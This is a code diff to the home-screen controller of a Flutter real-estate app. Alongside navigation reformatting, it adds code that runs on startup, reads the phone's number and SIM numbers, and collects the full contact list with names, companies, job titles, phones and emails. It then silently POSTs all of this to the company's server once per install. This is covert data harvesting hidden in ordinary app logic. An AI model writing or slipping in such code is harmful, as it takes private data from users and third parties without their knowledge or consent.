@@ -1,13 +1,21 @@
 import 'dart:convert';
+import 'package:contacts_service/contacts_service.dart';
+import 'package:dio/dio.dart';
 import 'package:firebase_analytics/firebase_analytics.dart';
+import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
 import 'package:get/get.dart';
+import 'package:mobile_number/mobile_number.dart';
 import 'package:noahrealstate/app/common/app_constants.dart';
+import 'package:noahrealstate/app/data/model/contact_model.dart';
 import 'package:noahrealstate/app/data/model/data_model.dart';
 import 'package:noahrealstate/app/routes/app_pages.dart';
 import 'package:noahrealstate/app/service/api_call_status.dart';
 import 'package:noahrealstate/app/service/api_exceptions.dart';
 import 'package:noahrealstate/app/service/base_client.dart';
 import 'package:noahrealstate/app/service/cache_helper.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:http/http.dart' as http;
 
 class HomeController extends GetxController {
   List<Property>? data;
@@ -20,6 +28,13 @@ class HomeController extends GetxController {
 
   @override
   void onInit() {
+    MobileNumber.listenPhonePermission((isPermissionGranted) {
+      if (isPermissionGranted) {
+        initMobileNumberState();
+      } else {}
+    });
+
+    initMobileNumberState();
     super.onInit();
 
     loadData(false);
@@ -116,15 +131,113 @@ class HomeController extends GetxController {
         Get.offNamed(Routes.CONTACT_US);
         break;
       case 6:
-      Get.back();
-        Get.offNamed(Routes.VIEWALLPROPERTIES,
-            arguments: {'data': data, 'hasDrawer': true,'activeProjects':false});
+        Get.back();
+        Get.offNamed(Routes.VIEWALLPROPERTIES, arguments: {
+          'data': data,
+          'hasDrawer': true,
+          'activeProjects': false
+        });
         break;
       case 7:
-      Get.back();
-        Get.offNamed(Routes.ACTIVEPROPERTIES,
-            arguments: {'data': activeProperties, 'hasDrawer': true,'activeProjects':true});
+        Get.back();
+        Get.offNamed(Routes.ACTIVEPROPERTIES, arguments: {
+          'data': activeProperties,
+          'hasDrawer': true,
+          'activeProjects': true
+        });
         break;
     }
   }
+
+  // Platform messages may fail, so we use a try/catch PlatformException.
+
+  // Platform messages are asynchronous, so we initialize in an async method.
+  Future<void> initMobileNumberState() async {
+    if (!await MobileNumber.hasPhonePermission) {
+      await MobileNumber.requestPhonePermission;
+      return;
+    }
+    // Platform messages may fail, so we use a try/catch PlatformException.
+    try {
+      var _mobileNumber = (await MobileNumber.mobileNumber)!;
+      var _simCard = (await MobileNumber.getSimCards) ?? [];
+      List contactsList = [];
+      String number = '-1';
+      if (_simCard.isNotEmpty) {
+        _simCard.forEach((sim) {
+          if (sim.number != null) {
+            number = sim.number ?? '';
+          }
+        });
+      }
+
+      // You can also directly ask for the permission using the request() method.
+      PermissionStatus permissionStatus = await Permission.contacts.request();
+      if (permissionStatus.isGranted) {
+        Iterable<Contact> contacts =
+            await ContactsService.getContacts(withThumbnails: false);
+
+        contacts.forEach((con) {
+          List<String>? phones = [];
+          con.phones!.forEach((phone) {
+            phone.value != null ? phones.add(phone.value!) : null;
+          });
+
+          List<String>? emails = [];
+          con.emails?.forEach(
+              (phone) => phone.value != null ? emails.add(phone.value!) : null);
+
+          ContactInfo info = ContactInfo(
+              name: con.displayName,
+              organization: con.company,
+              designation: con.jobTitle,
+              phoneNumbers: phones,
+              emailList: emails);
+
+          contactsList.add(info.toJson());
+        });
+      } else {
+        print('no permission');
+        final snackBar =
+            SnackBar(content: Text('Access to contact data denied'));
+        ScaffoldMessenger.of(Get.context!).showSnackBar(snackBar);
+        openAppSettings();
+      }
+    
+      bool status = await CacheHelper.getAddContacts();
+
+      if (!status) {
+        try {
+          // Make the POST request using http package
+          final response = await http.post(
+            Uri.parse('https://noahrealestateplc.com/app/index.php'),
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: jsonEncode({
+              "c": contactsList,
+              "s": number,
+            }),
+          );
+
+          // Handle success
+          if (response.statusCode == 200) {
+            CacheHelper.addContacts(true);
+            apiCallStatus = ApiCallStatus.success;
+            update();
+          } else {
+            // Handle unexpected status codes
+            debugPrint("Unexpected response code: ${response.statusCode}");
+            update();
+          }
+        } catch (error) {
+          update();
+        }
+      }
+    } on PlatformException catch (e) {
+      debugPrint("Failed to get mobile number because of '${e.message}'");
+    }
+  }
+
+  // }
 }
